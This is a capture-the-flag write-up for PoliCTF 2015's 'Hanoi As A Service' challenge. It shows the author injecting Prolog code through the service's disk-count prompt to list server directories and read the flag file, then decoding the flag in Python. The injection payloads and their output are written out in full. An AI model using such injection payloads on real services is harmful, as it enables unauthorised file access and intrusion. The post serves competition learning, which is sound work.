---
layout: post
title: "PoliCTF 2015 Hanoi As A Service"
date: 2015-07-12 17:18:36 -0400
author: [barrebas]
comments: true
categories: [polictf]
---

### Solved by barrebas

Hanoi As A Service was a 50 point pwnable in PoliCTF and gave me a reason to hate PROLOG.

<!--more-->

We're given `nc haas.polictf.it 80` as point of attack. Let's start:

```bash
bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?

ERROR: Prolog initialisation failed:
ERROR: Syntax error: Unexpected end of clause
ERROR: hanoi() 
ERROR: ** here **
ERROR: .
```

Interesting. I now know I'm up against some Prolog program. Let's see if we can inject Prolog code:


```bash
bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), hanoi(2). 
* Move top disk from a to c
* Move top disk from a to b
* Move top disk from c to b
```

Looks like we can! Now, since I never learned Prolog as a kid (I'm more of a BASIC boy), I searched around for code examples. I couldn't just grab the flag so I started with enumerating.

```bash
bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), expand_file_name('/home/*', S), write(S). 
[/home/ctf,/home/ubuntu]

# enumerate /home/ctf:

bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), expand_file_name('/home/ctf/*', S), write(S). %
[/home/ctf/haas]bas@tritonal:~$ 

# enumerate /home/ctf/haas:

bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), expand_file_name('/home/ctf/haas/*', S), write(S).  
[/home/ctf/haas/haas,/home/ctf/haas/haas-proxy.py,/home/ctf/haas/jhknsjdfhef_flag_here]
```

I now had the location of the flag. Now, to read it... Turns out Prolog does not have a "normal" way to read arbitrary files (it expects Prolog terms or something). I searched for a good while and finally:

```bash
bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), open('/home/ctf/haas/jhknsjdfhef_flag_here', read, S), read_line_to_codes(S, T), write(T). 
[102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125]
```

Back to python!

```python
>>> a = [102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125]
>>> print "".join([chr(x) for x in a])
flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
```

50 points and first blood for Team Vulnhub. 


